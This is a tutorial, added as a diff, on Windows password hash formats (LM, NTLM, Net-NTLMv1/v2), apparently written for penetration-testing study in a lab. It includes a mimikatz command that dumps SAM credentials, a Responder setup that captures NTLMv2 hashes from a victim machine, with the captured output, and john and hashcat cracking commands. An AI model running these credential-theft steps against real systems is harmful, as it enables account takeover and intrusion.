@@ -1,0 +1,304 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                           Hashes in Windows
+
+                                Hexdump
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. Hash Functions: Theory and Applications
+.. 1. Hash Functions and Authentication
+2. Windows Hashes
+.. 1. LM (LAN Manager) Hash
+.. 2. NTLM Hash
+.. 3. Net-NTLMv1
+.. 4. Net-NTLMv2
+.. 5. Kerberos
+.. 6. DPAPI
+3. Obtaining Hashes
+.. 1. LM, NTLM: SAM Dump with SeBackupPrivilege + Mimikatz
+.. 2. Net-NTLM: Responder
+4. Cracking Windows Hashes
+5. Rerefences
+
+
+1 Hash Functions: Theory and Applications
+=========================================
+
+  Hash functions are one-way functions that allow you to go from the
+  original password `P' to the hashed value `H(P)'.
+
+  ,----
+  | P -> H(P)
+  `----
+
+  For example, `sha256' is a commonly used hash function. In linux
+  systems, it is possible to access such function with the `sha256sum'
+  utility
+
+  ,----
+  | $ echo -n "leonardo" | sha256sum
+  | 18ccba186d8757c20cbf05d7a98b2c64f9f16eb64ea4a64659bbc5c9b7b3a7fe  -
+  `----
+
+
+1.1 Hash Functions and Authentication
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  In the context of authentication, hash functions are used for
+  protecting users credentials since:
+
+  - they are easy to compute
+  - they are hard to reverse
+
+  Web applications for example store the hash of the user password
+  within a database. This allow the application to verify the
+  authenticity of the client during login.
+
+  Hashes are also used in the Windows operating system for
+  authentication purposes.
+
+  Authentication Procedure
+  ,----
+  | 1. User gives Password P to process
+  | 2. Process computes hash H(P)
+  | 3. Process checks that the hash H(P) is present in a trusted data source
+  | 4. If it is, authentication succeeds
+  | 5. If it is not, authentication fails
+  `----
+
+
+2 Windows Hashes
+================
+
+  Windows uses several different hash formats.
+
+
+2.1 LM (LAN Manager) Hash
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Oldest password storage used by Windows.  Turned off by default since
+  Windows Vista/Windows Server 2008.
+
+  Algorithm for computing it
+  - Ref:
+    <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+  ,----
+  | 1. Convert all lower case to upper case
+  | 2. Pad password to 14 characters with NULL characters
+  | 3. Split the password to two 7 character chunks
+  | 4. Create two DES keys from each 7 character chunk
+  | 5. DES encrypt the string "KGS!@#$%" with these two chunks
+  | 6. Concatenate the two DES encrypted strings. This is the LM hash.
+  `----
+
+  Check LM hash configuration, if it returns `1' it means LM hashes are
+  not generated.
+  ,----
+  | Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'NoLMHash'
+  `----
+
+
+2.2 NTLM Hash
+~~~~~~~~~~~~~
+
+  The way passwords are stored on Modern Systems.  This is what we
+  obtain when dumping the SAM database.
+
+  ,----
+  | MD4(UTF-16-LE(password))
+  `----
+
+  Where `UTF-16-LE' is the little endian of `UTF-16'.
+
+  For example, the NTLM hash of `password' is
+  ,----
+  | 8846F7EAEE8FB117AD06BDD830B7586C
+  `----
+
+
+2.3 Net-NTLMv1
+~~~~~~~~~~~~~~
+
+  The NTLM protocol uses the NTHash in a challenge/response between
+  server and client.
+
+  It is possible to obtain a response to crack from a client using tools
+  such as `responder'.
+
+  Algorithm for computing it
+  - Ref:
+    <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+  ,----
+  | C = 8-byte server challenge, random
+  | K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
+  | response = DES(K1,C) | DES(K2,C) | DES(K3,C)
+  `----
+
+
+2.4 Net-NTLMv2
+~~~~~~~~~~~~~~
+
+  New version of the `NTLM' protocol.
+
+  It is possible to obtain a response to crack from a client using tools
+  such as `responder'.
+
+  Algorithm for computing it
+  - Ref:
+    <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+  ,----
+  | SC = 8-byte server challenge, random
+  | CC = 8-byte client challenge, random
+  | CC* = (X, time, CC2, domain name)
+  | v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
+  | LMv2 = HMAC-MD5(v2-Hash, SC, CC)
+  | NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
+  | response = LMv2 | CC | NTv2 | CC*
+  `----
+
+  ----------------------------------------------------------------------
+
+  To check whether the system is running NTLMv1 or NTLMv2 you can check
+  as follows
+
+  ,----
+  | Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LMCompatibilityLevel'
+  `----
+
+  If the path does not exist, then the default is used, which is
+  `Net-NTLMv2'.
+
+
+2.5 Kerberos
+~~~~~~~~~~~~
+
+  Used for Authentication.  For example Ticket Hashes (TGT and TGS).
+
+  Will be explored more in the `active directory' series.
+
+
+2.6 DPAPI
+~~~~~~~~~
+
+  Hashed used for Data Encryption.
+
+
+3 Obtaining Hashes
+==================
+
+3.1 LM, NTLM: SAM Dump with SeBackupPrivilege + Mimikatz
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  ,----
+  | mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+  `----
+
+
+3.2 Net-NTLM: Responder
+~~~~~~~~~~~~~~~~~~~~~~~
+
+  By forcing a connection from the Windows victim to a controlled Linux
+  host, it is possible to obtain the Net-NTLMv1 or Net-NTLMv2 hash,
+  which can then be cracked.
+
+  In your attacker linux box, install the following
+  ,----
+  | python3 -m venv venv
+  | . venv/bin/activate
+  | 
+  | pip3 install impacket
+  | pip install netifaces
+  | 
+  | git clone https://github.com/lgandx/Responder.git
+  | 
+  `----
+
+  Then start responder on the network interface you share with the
+  victim
+  ,----
+  | cd Responder
+  | sudo python3 Responder.py -I virbr0
+  `----
+
+  Then, from the victim machine, connect back to the linux host
+  ,----
+  | C:\Users\Quickemu\Downloads> dir \\192.168.122.1\test
+  | Access is denied.
+  `----
+
+  You will see the following
+
+  ,----
+  | [SMB] NTLMv2-SSP Client   : 192.168.122.149
+  | [SMB] NTLMv2-SSP Username : QUICKEM-H5DSQ1V\Quickemu
+  | [SMB] NTLMv2-SSP Hash     : Quickemu::QUICKEM-H5DSQ1V:811ddd24a96dac68:7C870C1A89B277BF890CB8DCFCD8CCDF:010100000000000080D838EDFA44DB017AD8100152324201000000000200080046005A003600560001001E00570049004E002D0050004C00430047005800510050004A0050003800330004003400570049004E002D0050004C00430047005800510050004A005000380033002E0046005A00360056002E004C004F00430041004C000300140046005A00360056002E004C004F00430041004C000500140046005A00360056002E004C004F00430041004C000700080080D838EDFA44DB0106000400020000000800300030000000000000000000000000300000A2EAFCAABF7A0B6E337443D5B55C65BA97FCBB0ADB5AACB602CE7AADF6F933D40A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100320032002E0031000000000000000000
+  `----
+
+
+4 Cracking Windows Hashes
+=========================
+
+  To crack hashes we need a wordlist made up of various passwords.
+
+  One of the most used one is the `rockyou.txt'
+  - <https://github.com/danielmiessler/SecLists>
+
+    ,----
+    | curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz > rockyou.txt.tar.gz
+    | tar -xvf rockyou.txt.tar.gz
+    `----
+
+  Some of the passwords contained within `rockyou.txt'
+
+  ,----
+  | $ head -n 5 rockyou.txt
+  | 123456
+  | 12345
+  | 123456789
+  | password
+  | iloveyou
+  `----
+
+  ----------------------------------------------------------------------
+
+  To crak a LM hash
+  ,----
+  | john --format=lm --wordlist=rockyou.txt hash.txt
+  | hashcat -m 3000 -a 3 hash.txt
+  `----
+
+  To crack a NTLM hash
+  ,----
+  | john --format=nt --wordlist=rockyou.txt hash.txt
+  | hashcat -m 1000 -a 3 hash.txt
+  `----
+
+  To crack a Net-NTLMv1
+  ,----
+  | john --format=netntlm --wordlist=rockyou.txt hash.txt
+  | hashcat -m 5500 -a 3 hash.txt
+  `----
+
+  To crack a Net-NTLMv2
+  ,----
+  | john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
+  | hashcat -m 5600 -a 3 hash.txt
+  `----
+
+
+5 Rerefences
+============
+
+  LM, NTLM, Net-NTLMv2, oh my!
+  <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+
+  Windows Privilege Escalation: SeBackupPrivilege
+  <https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/>
+
+  Retrieving NTLM Hashes and what changed in Windows 10
+  <https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/#Step_By_Step_Examplenew_NTLM_Hash_Retrieval_AES_Cipher>
